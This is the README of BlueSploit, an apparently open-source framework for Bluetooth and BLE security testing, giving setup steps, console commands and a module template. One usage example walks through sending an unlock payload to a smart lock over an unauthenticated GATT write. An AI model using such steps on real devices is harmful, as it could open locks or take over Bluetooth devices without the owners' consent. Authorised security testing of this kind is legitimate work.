# BlueSploit

**Bluetooth Exploitation Framework**

A Metasploit-style modular framework for Bluetooth Classic and BLE security testing.

I started building this with a purpose. Since it’s an early version, there may be stability issues and false positives. I’m still working on it, so please be patient.

![Python](https://img.shields.io/badge/python-3.10+-blue.svg)
![License](https://img.shields.io/badge/license-MIT-green.svg)
![Platform](https://img.shields.io/badge/platform-Linux%20|%20macOS%20|-lightgrey.svg)

## Features

- 🔍 **Device Discovery** - Scan for nearby BLE and Classic Bluetooth devices
- 📊 **GATT Enumeration** - Enumerate services, characteristics, and descriptors
- 🔓 **Exploit Modules** - Ready-to-use exploits for common vulnerabilities
- 🔑 **Credential Testing** - Test for default/weak PINs and pairing vulnerabilities
- 📝 **Modular Architecture** - Easy to extend with custom modules
- 💾 **Result Export** - Save scan results and loot to JSON

## Installation

```bash
# Clone the repository
git clone https://github.com/v33ru/bluesploit.git
cd bluesploit

#create python virtual environment
python3 -m venv env
source env/bin/activate

# Install dependencies
pip install -r requirements.txt

# Run BlueSploit
python bluesploit.py
```
![](a.png)

### Requirements

- Python 3.10+
- Bluetooth adapter (built-in or USB dongle)
- Linux: `bluez` stack installed
- macOS: Works out of the box
- Windows: Requires Windows 10+ with BLE support

## Quick Start

```
$ python bluesploit.py

    ╔═════════════════════════════════════════════════════════════════════════════════╗
    ║                                                                                 ║
    ║  ██████╗ ██╗     ██╗   ██╗███████╗███████╗██████╗ ██╗      ██████╗ ██╗████████╗ ║
    ║  ██╔══██╗██║     ██║   ██║██╔════╝██╔════╝██╔══██╗██║     ██╔═══██╗██║╚══██╔══╝ ║
    ║  ██████╔╝██║     ██║   ██║█████╗  ███████╗██████╔╝██║     ██║   ██║██║   ██║    ║
    ║  ██╔══██╗██║     ██║   ██║██╔══╝  ╚════██║██╔═══╝ ██║     ██║   ██║██║   ██║    ║
    ║  ██████╔╝███████╗╚██████╔╝███████╗███████║██║     ███████╗╚██████╔╝██║   ██║    ║
    ║  ╚═════╝ ╚══════╝ ╚═════╝ ╚══════╝╚══════╝╚═╝     ╚══════╝ ╚═════╝ ╚═╝   ╚═╝    ║
    ║                                                                                 ║
    ╠═════════════════════════════════════════════════════════════════════════════════╣
    ║                                                                                 ║
    ║  Bluetooth Exploitation Framework                            v1.0.0             ║
    ║  ─────────────────────────────────────────────────────────────────────────────  ║
    ║                                                                                 ║
    ║  ◉ Author    : v33ru / Mr-IoT                                                   ║
    ║  ◉ Community : IoT Security Research Group (IOTSRG)                             ║
    ║  ◉ GitHub    : https://github.com/v33ru                                         ║
    ║                                                                                 ║
    ╠═════════════════════════════════════════════════════════════════════════════════╣
    ║                                                                                 ║
    ║  [+] BLE Scanning & Enumeration    [+] GATT Service Analysis                    ║
    ║  [+] Bluetooth Classic Attacks     [+] Vulnerability Detection                  ║
    ║  [+] Exploitation Modules          [+] Protocol Reverse Engineering             ║
    ║                                                                                 ║
    ╚═════════════════════════════════════════════════════════════════════════════════╝

    ┌─────────────────────────────────────────────────────────────────────────────┐
    │   Type 'help' for commands     Type 'show modules' to list modules          │
    └─────────────────────────────────────────────────────────────────────────────┘

bluesploit > help

  Core Commands
  =============
    use <module>      Load a module
    back              Unload current module
    search <keyword>  Search for modules
    show <type>       Show modules/options
    
  Module Commands
  ===============
    set <opt> <val>   Set module option
    unset <option>    Clear module option
    options           Show module options
    info              Show module info
    run / exploit     Execute module
    check             Check if vulnerable
    
  Utility Commands
  ================
    clear             Clear screen
    reload            Reload modules
    setg <opt> <val>  Set global option
    banner            Show banner
    exit / quit       Exit BlueSploit

```

## Usage Examples

### Discover BLE Devices

```
bluesploit > use scanners/ble/discovery
bluesploit (scanners/ble/discovery) > set timeout 15
bluesploit (scanners/ble/discovery) > run

[*] Scanning for BLE devices (15s)...
[+] AA:BB:CC:DD:EE:FF - Smart Lock [-45 dBm] [Nordic Semiconductor]
[+] 11:22:33:44:55:66 - MI Band 7 [-62 dBm] [Xiaomi]
[+] Found 2 devices
```

### Enumerate GATT Services

```
bluesploit > use scanners/ble/gatt_enum
bluesploit (scanners/ble/gatt_enum) > set target AA:BB:CC:DD:EE:FF
bluesploit (scanners/ble/gatt_enum) > run

[+] Connected to AA:BB:CC:DD:EE:FF
[*] Enumerating GATT services...

  [Service] 00001800-0000-1000-8000-00805f9b34fb
  Generic Access (Handle: 0x0001)
    ├── [Char] 00002a00-0000-1000-8000-00805f9b34fb
    │   Device Name
    │   Properties: read
    │   Value: Smart Lock

  [Service] 0000fee0-0000-1000-8000-00805f9b34fb
  Custom Service (Handle: 0x0010)
    ├── [Char] 0000fee1-0000-1000-8000-00805f9b34fb ⚠ VULN
    │   Properties: write-without-response, notify
    │   ⚠ UNAUTH_WRITE_POSSIBLE: Write-without-response enabled
```

### Exploit Unauthenticated Write

```
bluesploit > use exploits/ble/unauth_write
bluesploit (exploits/ble/unauth_write) > set target AA:BB:CC:DD:EE:FF
bluesploit (exploits/ble/unauth_write) > set char_uuid 0000fee1-0000-1000-8000-00805f9b34fb
bluesploit (exploits/ble/unauth_write) > set payload 0601  # Unlock command
bluesploit (exploits/ble/unauth_write) > check

[*] Checking AA:BB:CC:DD:EE:FF for vulnerability...
[+] Found characteristic: 0000fee1-0000-1000-8000-00805f9b34fb
[+] VULNERABLE: Write-without-response enabled!

bluesploit (exploits/ble/unauth_write) > run

[+] Connected to AA:BB:CC:DD:EE:FF
[+] Payload delivered!
```

## Module Structure

```
modules/
├── scanners/           # Discovery & enumeration
│   ├── ble/
│   │   ├── discovery.py       # BLE device discovery
│   │   └── gatt_enum.py       # GATT service enumeration
│   └── classic/
│       └── sdp_enum.py        # SDP service discovery
├── exploits/           # Vulnerability exploits
│   ├── ble/
│   │   └── unauth_write.py    # Unauthenticated GATT write
│   └── classic/
│       └── ...
├── creds/              # Credential attacks (this is not right folder fixing soon full release)
│   └── ...
├── auxiliary/          # Support modules
│   └── ...
└── payloads/           # Payload generators
    └── ...
```

## Writing Custom Modules

Create a new module in the appropriate directory:

```python
# modules/scanners/ble/my_scanner.py

from core.base import ScannerModule, ModuleInfo, ModuleOption, BTProtocol, Severity

class Module(ScannerModule):
    info = ModuleInfo(
        name="scanners/ble/my_scanner",
        description="My custom BLE scanner",
        author=["your_name"],
        protocol=BTProtocol.BLE,
        severity=Severity.INFO
    )
    
    def _setup_options(self):
        self.options = {
            "target": ModuleOption("target", True, "Target BD_ADDR"),
            "timeout": ModuleOption("timeout", False, "Scan timeout", default=10)
        }
    
    def run(self) -> bool:
        # Your scanning logic here
        target = self.get_option("target")
        print(f"Scanning {target}...")
        return True
```

## Contributing

Contributions are welcome! Please feel free to submit a Pull Request.

1. Fork the repository
2. Create your feature branch (`git checkout -b feature/new-module`)
3. Commit your changes (`git commit -am 'Add new module'`)
4. Push to the branch (`git push origin feature/new-module`)
5. Open a Pull Request

## Roadmap

- [ ] Bluetooth Classic support (BR/EDR)
- [ ] PIN bruteforce module
- [ ] BTSnoop log analyzer (GhostWrite integration)
- [ ] Replay attack module
- [ ] Database for session/loot storage
- [ ] Ubertooth integration
- [ ] BTLEJuice integration

## Legal Disclaimer

This tool is provided for educational and authorized security testing purposes only. Unauthorized access to computer systems is illegal. Users are responsible for complying with all applicable laws. The authors assume no liability for misuse.

## Author

**v33ru / Mr-IoT** - IoT Security Research Group (IOTSRG)

- GitHub: [@v33ru](https://github.com/v33ru)
- Research: All Attack Surface in BLE

## License

MIT License - See [LICENSE](LICENSE) for details.

## Acknowledgments

- Inspired by [RouterSploit](https://github.com/threat9/routersploit) and [Metasploit](https://www.metasploit.com/)
- Built with [Bleak](https://github.com/hbldh/bleak) for cross-platform BLE support
- Thanks to the Bluetooth security research community
